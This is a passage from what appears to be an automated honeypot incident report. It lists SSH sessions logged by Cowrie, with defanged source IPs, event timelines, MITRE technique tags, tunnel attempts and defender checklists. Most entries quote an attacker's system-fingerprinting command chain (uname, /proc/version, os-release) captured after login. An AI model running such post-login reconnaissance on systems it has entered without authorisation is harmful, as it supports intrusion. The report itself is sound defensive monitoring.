| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:16:54` | `cowrie.session.connect` |
| `2026-08-22 15:16:55` | `cowrie.client.version` |
| `2026-08-22 15:16:55` | `cowrie.client.kex` |
| `2026-08-22 15:17:04` | `cowrie.login.success` |
| `2026-08-22 15:17:06` | `cowrie.session.params` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.success` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:06` | `cowrie.command.input` |
| `2026-08-22 15:17:07` | `cowrie.command.input` |
| `2026-08-22 15:17:07` | `cowrie.log.closed` |
| `2026-08-22 15:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f7b8e1f9251

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:18 |
| **Last Seen** | 2026-08-22 15:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:18:28` | `cowrie.session.connect` |
| `2026-08-22 15:18:28` | `cowrie.client.version` |
| `2026-08-22 15:18:28` | `cowrie.client.kex` |
| `2026-08-22 15:18:30` | `cowrie.login.success` |
| `2026-08-22 15:18:32` | `cowrie.session.params` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.success` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.command.input` |
| `2026-08-22 15:18:32` | `cowrie.log.closed` |
| `2026-08-22 15:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e49944373e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:19 |
| **Last Seen** | 2026-08-22 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:19:32` | `cowrie.session.connect` |
| `2026-08-22 15:19:32` | `cowrie.client.version` |
| `2026-08-22 15:19:32` | `cowrie.client.kex` |
| `2026-08-22 15:19:33` | `cowrie.login.success` |
| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:19:33` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14fa234afcd5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:19 |
| **Last Seen** | 2026-08-22 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:19:43` | `cowrie.session.connect` |
| `2026-08-22 15:19:43` | `cowrie.client.version` |
| `2026-08-22 15:19:43` | `cowrie.client.kex` |
| `2026-08-22 15:19:44` | `cowrie.login.success` |
| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:19:44` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84ccf5ee349

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:20 |
| **Last Seen** | 2026-08-22 15:20 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:20:15` | `cowrie.session.connect` |
| `2026-08-22 15:20:16` | `cowrie.client.version` |
| `2026-08-22 15:20:16` | `cowrie.client.kex` |
| `2026-08-22 15:20:21` | `cowrie.login.success` |
| `2026-08-22 15:20:24` | `cowrie.session.params` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.success` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:24` | `cowrie.command.input` |
| `2026-08-22 15:20:25` | `cowrie.log.closed` |
| `2026-08-22 15:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13b7fc2b6536

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:21 |
| **Last Seen** | 2026-08-22 15:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:21:57` | `cowrie.session.connect` |
| `2026-08-22 15:21:58` | `cowrie.client.version` |
| `2026-08-22 15:21:58` | `cowrie.client.kex` |
| `2026-08-22 15:22:02` | `cowrie.login.success` |
| `2026-08-22 15:22:05` | `cowrie.session.params` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.success` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.command.input` |
| `2026-08-22 15:22:05` | `cowrie.log.closed` |
| `2026-08-22 15:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00adafdfa26e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:23 |
| **Last Seen** | 2026-08-22 15:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:23:19` | `cowrie.session.connect` |
| `2026-08-22 15:23:19` | `cowrie.client.version` |
| `2026-08-22 15:23:19` | `cowrie.client.kex` |
| `2026-08-22 15:23:22` | `cowrie.login.success` |
| `2026-08-22 15:23:24` | `cowrie.session.params` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.success` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:24` | `cowrie.command.input` |
| `2026-08-22 15:23:25` | `cowrie.log.closed` |
| `2026-08-22 15:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90826b6c08a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:24 |
| **Last Seen** | 2026-08-22 15:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:24:47` | `cowrie.session.connect` |
| `2026-08-22 15:24:48` | `cowrie.client.version` |
| `2026-08-22 15:24:48` | `cowrie.client.kex` |
| `2026-08-22 15:24:52` | `cowrie.login.success` |
| `2026-08-22 15:24:55` | `cowrie.session.params` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.success` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.command.input` |
| `2026-08-22 15:24:55` | `cowrie.log.closed` |
| `2026-08-22 15:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01552fd41917

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-08-22 15:25 |
| **Last Seen** | 2026-08-22 15:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:25:51` | `cowrie.session.connect` |
| `2026-08-22 15:25:51` | `cowrie.client.version` |
| `2026-08-22 15:25:51` | `cowrie.client.kex` |
| `2026-08-22 15:25:52` | `cowrie.login.success` |
| `2026-08-22 15:25:53` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7e54afc186

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:26 |
| **Last Seen** | 2026-08-22 15:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:26:08` | `cowrie.session.connect` |
| `2026-08-22 15:26:09` | `cowrie.client.version` |
| `2026-08-22 15:26:09` | `cowrie.client.kex` |
| `2026-08-22 15:26:11` | `cowrie.login.success` |
| `2026-08-22 15:26:14` | `cowrie.session.params` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.success` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.command.input` |
| `2026-08-22 15:26:14` | `cowrie.log.closed` |
| `2026-08-22 15:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473b44d2b7f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:27 |
| **Last Seen** | 2026-08-22 15:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:27:22` | `cowrie.session.connect` |
| `2026-08-22 15:27:23` | `cowrie.client.version` |
| `2026-08-22 15:27:23` | `cowrie.client.kex` |
| `2026-08-22 15:27:25` | `cowrie.login.success` |
| `2026-08-22 15:27:27` | `cowrie.session.params` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.success` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.command.input` |
| `2026-08-22 15:27:27` | `cowrie.log.closed` |
| `2026-08-22 15:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69088b24fd8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:28 |
| **Last Seen** | 2026-08-22 15:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:28:34` | `cowrie.session.connect` |
| `2026-08-22 15:28:34` | `cowrie.client.version` |
| `2026-08-22 15:28:34` | `cowrie.client.kex` |
| `2026-08-22 15:28:35` | `cowrie.login.success` |
| `2026-08-22 15:28:37` | `cowrie.session.params` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.success` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:37` | `cowrie.command.input` |
| `2026-08-22 15:28:38` | `cowrie.log.closed` |
| `2026-08-22 15:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9084e23fd569

| Field | Detail |
|---|---|
| **Source IP** | `121.1.120[.]2` |
| **First Seen** | 2026-08-22 15:29 |
| **Last Seen** | 2026-08-22 15:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:29:27` | `cowrie.session.connect` |
| `2026-08-22 15:29:28` | `cowrie.client.version` |
| `2026-08-22 15:29:28` | `cowrie.client.kex` |
| `2026-08-22 15:29:31` | `cowrie.login.success` |
| `2026-08-22 15:29:32` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.1.120[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.1.120[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fdc062778c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:29 |
| **Last Seen** | 2026-08-22 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:29:34` | `cowrie.session.connect` |
| `2026-08-22 15:29:34` | `cowrie.client.version` |
| `2026-08-22 15:29:34` | `cowrie.client.kex` |
| `2026-08-22 15:29:35` | `cowrie.login.success` |
| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf5d5c50222

| Field | Detail |
|---|---|
| **Source IP** | `80.191.253[.]228` |
| **First Seen** | 2026-08-22 15:29 |
| **Last Seen** | 2026-08-22 15:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:29:37` | `cowrie.session.connect` |
| `2026-08-22 15:29:37` | `cowrie.client.version` |
| `2026-08-22 15:29:37` | `cowrie.client.kex` |
| `2026-08-22 15:29:38` | `cowrie.login.success` |
| `2026-08-22 15:29:39` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.191.253[.]228` to AbuseIPDB if not already reported
- [ ] Block `80.191.253[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997b71d48cb0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:29 |
| **Last Seen** | 2026-08-22 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
